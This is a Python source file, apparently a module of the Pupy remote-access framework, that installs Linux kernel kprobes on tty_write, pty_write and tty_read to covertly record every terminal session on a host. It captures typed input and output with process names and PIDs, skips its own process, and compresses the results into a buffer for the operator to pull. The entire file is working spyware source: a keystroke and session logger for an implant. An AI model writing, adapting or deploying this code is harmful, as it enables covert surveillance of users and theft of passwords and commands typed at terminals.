# -*- encoding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

__all__ = (
    'TTYMon', 'TTYRec', 'start', 'stop', 'dump'
)

import os
import re
import fcntl
import select
import errno
import struct
import zlib

from io import open
from threading import Lock

from pupy import manager, Task

try:
    from network.lib.transports.cryptoutils import get_random
except ImportError:
    def get_random(cnt):
        with open('/dev/urandom', 'rb') as urandom:
            return urandom.read(cnt)

if not __name__ == '__main__':
    from network.lib.buffer import Buffer

DEBUGFS='/sys/kernel/debug'

KPROBE_REGISTRY='tracing/kprobe_events'
TRACE_PIPE='tracing/trace_pipe'
TRACE='tracing/trace'
KPROBE_EVENTS='tracing/events/kprobes'
KPROBES_ENABLED='kprobes/enabled'

# These are to derive tty_struct from file*
# name can be found from synclink.ko:mgsl_stop/mgsl_start
TTY_PRIVATE_2 = '0x0'


def _to_int(x):
    if x is None:
        return None
    elif isinstance(x, (int, long)):
        return x
    elif x.startswith('0x'):
        return int(x[2:], 16)
    else:
        return int(x)


class KProbesNotAvailable(Exception):
    pass


class KProbesNotEnabled(Exception):
    pass


class Kallsyms(object):
    def __init__(self):
        with open('/proc/kallsyms') as kallsyms:
            for ks in kallsyms:
                ks = ks.strip()
                addr, t, name = ks.split(' ')[:3]
                setattr(self, name, addr)


class TTYState(object):
    __slots__ = (
        'size', 'first_input'
    )

    def __init__(self):
        self.size = None
        self.first_input = None

    def need_resize(self, size):
        if self.size is None:
            self.size = size
            return True

        if self.size != size:
            self.size = size
            return True

        return False

    def get_last_input(self, ts):
        ts = float(ts)
        if self.first_input is None:
            self.first_input = ts
            return 0.0

        return ts - self.first_input


class Probe(object):
    __slots__ = (
        'type', 'name', 'func', 'args', 'kwargs'
    )

    def __init__(self, type, name, func, *args, **kwargs):
        self.type = type
        self.name = name
        self.func = func
        self.args = args
        self.kwargs = kwargs

    @property
    def registered(self):
        return os.path.exists(
            os.path.join(DEBUGFS, KPROBE_EVENTS, self.name, 'enable')
        )

    @property
    def statement(self):
        parts = [
            self.type + ':' + self.name,
            self.func
        ]

        parts.extend(self.args)

        statement = ' '.join(parts)
        if self.kwargs:
            statement = statement.format(**self.kwargs)

        return statement

    def enable(self):
        if not self.registered:
            return

        with open(os.path.join(
                DEBUGFS, KPROBE_EVENTS, self.name, 'enable'), 'w') as enable:
            enable.write('1\n')

    def disable(self):
        if not self.registered:
            return

        with open(os.path.join(
                DEBUGFS, KPROBE_EVENTS, self.name, 'enable'), 'w') as enable:
            enable.write('0\n')

    def unregister(self):
        if not self.registered:
            return

        try:
            with open(os.path.join(
                    DEBUGFS, KPROBE_REGISTRY), 'w') as registry:
                registry.write('-:' + self.name+'\n')
        except IOError:
            pass


class TTYMon(object):
    def __init__(self, name, winsize, tty_private, ignore=[]):
        self.validate()

        kallsyms = Kallsyms()

        self._ignore = [ignore] if type(ignore) is int else ignore

        self._probes = [
            Probe(
                'p',
                'tty_o',
                '0x{addr}',
                '+{tty_name_offt}(+{struct}(+{private}({vfs_file}))):string',
                '+{winsiz_offt_x}(+{struct}(+{private}({vfs_file}))):u16',
                '+{winsiz_offt_y}(+{struct}(+{private}({vfs_file}))):u16',
                '{size}:s32',
                '+0({buffer}):string',
                addr=kallsyms.tty_write,
                buffer=r'%si',
                vfs_file=r'%di',
                size=r'%dx',
                tty_name_offt=name,
                struct=TTY_PRIVATE_2,
                private=tty_private,
                winsiz_offt_x=winsize+2,
                winsiz_offt_y=winsize
            ),
            Probe(
                'p',
                'pty_o',
                '0x{addr}',
                '+{tty_name_offt}({tty_struct}):string',
                '+{winsiz_offt_x}({tty_struct}):u16',
                '+{winsiz_offt_y}({tty_struct}):u16',
                '{size}:s32',
                '+0({buffer}):string',
                addr=kallsyms.pty_write,
                buffer=r'%si',
                tty_struct=r'%di',
                size=r'%dx',
                tty_name_offt=name,
                winsiz_offt_x=winsize+2,
                winsiz_offt_y=winsize
            ),
            Probe(
                'r',
                'tty_i',
                'tty_read',
                '+{tty_name_offt}(+{struct}(+{private}({vfs_file}))):string',
                '+{winsiz_offt_x}(+{struct}(+{private}({vfs_file}))):u16',
                '+{winsiz_offt_y}(+{struct}(+{private}({vfs_file}))):u16',
                '{size}:s64',
                '+0({buffer}):string',
                vfs_file='$stack1',
                buffer='$stack2',
                size='$retval',
                tty_name_offt=name,
                struct=TTY_PRIVATE_2,
                private=tty_private,
                winsiz_offt_x=winsize+2,
                winsiz_offt_y=winsize
            )
        ]

        self._tty_cache = {}
        self._started = False
        self._stopping = False
        self._stopped = True
        self._pipe = None
        self._pipe_fd = None
        self._parser_body = r'\s+([^-]+)-(\d+)\s+\[\d+\]\s+[^\s]+\s+(\d+\.\d+):' \
            r'\s+({})_([o|i]):\s+\([^+]+\+[^)]+\)\s+arg1="([^"]+)"\s+arg2=(\S+)\s+arg3=(\S+)\s+arg4=(-?\S+)\s+arg5="'.format(
                '|'.join(probe.name.rsplit('_', 1)[0] for probe in self._probes))

        self._parser_start = re.compile(self._parser_body)
        self._parser_end = re.compile('"\n'+self._parser_body, re.MULTILINE)

    def validate(self):
        if not os.path.exists(os.path.join(DEBUGFS, KPROBE_REGISTRY)):
            raise KProbesNotAvailable('Tracing using KProbes are not accessible/available')

        with open(os.path.join(DEBUGFS, KPROBES_ENABLED)) as enabled:
            if int(enabled.read().strip()) == 0:
                raise KProbesNotEnabled('KProbes were intentionally disabled')

    def stop(self):
        self._stopping = True

    @property
    def active(self):
        return self._started and not self._stopped

    def _enable(self):

        # Ensure stopped
        self._disable()

        self._stopped = False
        self._stopping = False

        statement = '\n'.join(
            probe.statement for probe in self._probes
        ) + '\n'

        try:
            with open(os.path.join(
                    DEBUGFS, KPROBE_REGISTRY), 'w') as registry:
                registry.write(statement)

            for probe in self._probes:
                probe.enable()

        except IOError:
            self._disable()
            raise

        self._started = True

    def _disable(self):
        statement = '\n'.join(
            ('-:' + probe.name) for probe in self._probes
        ) + '\n'

        for probe in self._probes:
            probe.disable()

        try:
            with open(os.path.join(
                    DEBUGFS, KPROBE_REGISTRY), 'w') as registry:
                registry.write(statement)
        except IOError:
            pass

    def __iter__(self):
        self._enable()

        try:
            with open(os.path.join(DEBUGFS, TRACE), 'w') as trace:
                trace.write('')

            self._pipe = open(os.path.join(DEBUGFS, TRACE_PIPE), 'rb')
            self._pipe_fd = self._pipe.fileno()

            flag = fcntl.fcntl(self._pipe_fd, fcntl.F_GETFL)
            fcntl.fcntl(self._pipe_fd, fcntl.F_SETFL, flag | os.O_NONBLOCK)

            for block in self._collector():
                yield block
        finally:
            try:
                self._disable()
            except IOError:
                pass

            self._pipe.close()

        self._stopped = True
        self._started = False

    def _collector(self):
        more = True
        buf = ''

        while not self._stopping:
            if more:
                try:
                    r = os.read(self._pipe_fd, 8192)

                    buf += r
                except OSError as e:
                    if e.errno not in (errno.EAGAIN, errno.ENODATA):
                        raise

                    _, _, xlist = select.select(
                        [self._pipe], [], [self._pipe], 10
                    )
                    if xlist:
                        break

                    continue

            start = self._parser_start.search(buf)
            more = not bool(start)
            if more:
                more = True
                continue

            rest = buf[start.end():]
            end = self._parser_end.search(rest)
            more = not bool(end)

            if more:
                continue

            comm, pid, ts, rule, probe, tty_name, x, y, items = \
                start.groups()

            # groups_debug.write(repr(start.groups()) + '\n')

            pid = _to_int(pid)
            items = _to_int(items)
            x = _to_int(x)
            y = _to_int(y)

            data = rest[:end.start()]
            buf = rest[end.start()+2:]

            if items > 0:
                data = data[:items]
            else:
                # Something went wrong
                continue

            if tty_name.startswith('ptm'):
                # Throw away this crap
                continue

            if rule == 'tty' and not tty_name.startswith(
                    'tty') and probe == 'o':
                # Throw away pty/tty duplicates
                continue

            if tty_name not in self._tty_cache:
                self._tty_cache[tty_name] = TTYState()

            ts = self._tty_cache[tty_name].get_last_input(ts)

            if pid in self._ignore:
                continue

            if self._tty_cache[tty_name].need_resize((x, y)):
                yield tty_name, comm, pid, 'R', ts, (x, y)

            yield tty_name, comm, pid, probe, ts, data


class TTYRec(Task):
    __slots__ = ('_ttymon', '_results_lock', '_state', '_event_id')

    def __init__(self, manager, event_id=None,
            name=None, winsize=None, tty_private=None):
        super(TTYRec, self).__init__(manager)
        self._ttymon = TTYMon(
            name, winsize, tty_private, ignore=[os.getpid(), os.getppid()]
        )
        self._results_lock = Lock()
        self._buffer = Buffer()
        self._compressor = zlib.compressobj(9)
        self._event_id = event_id
        self._session = 0

    def task(self):
        self._session, = struct.unpack('<I', get_random(4))

        for tty_name, comm, pid, probe, ts, buf in self._ttymon:

            tty_name = tty_name[:8].ljust(8)
            comm = comm[:16].ljust(16)

            if probe == 'R':
                buf = struct.pack('<HH', *buf)

            with self._results_lock:
                packet = self._compressor.compress(
                    struct.pack(
                        '<I8s16ssIfI',
                        self._session, tty_name, comm, probe, pid,
                        ts, len(buf)) + buf)
                self._buffer.append(packet)

                fire_event = False

                if not self._dirty:
                    fire_event = True

                self._dirty = True

                try:
                    if fire_event and self._event_id is not None:
                        self.broadcast_event(self._event_id)
                except Exception:
                    pass

    @property
    def results(self):
        result = None

        with self._results_lock:
            if not self._dirty:
                return None

            try:
                packet = self._compressor.flush()
                self._buffer.append(packet)
            except zlib.error:
                pass

            result = self._buffer
            self._buffer = Buffer()
            self._compressor = zlib.compressobj(9)
            self._dirty = False

        return result

    @property
    def active(self):
        return self._ttymon.active

    def stop(self):
        self._ttymon.stop()
        super(TTYRec, self).stop()


def start(event_id=None, name=0xE0, winsize=0x1B0, tty_private=0x30):
    try:
        if manager.active(TTYRec):
            return False
    except:
        try:
            manager.stop(TTYRec)
        except:
            pass

    return manager.create(
        TTYRec, event_id=event_id,
        name=name, winsize=winsize, tty_private=tty_private
    )


def stop():
    return manager.stop(TTYRec)


def dump():
    ttyrec = manager.get(TTYRec)
    if ttyrec:
        return ttyrec.results
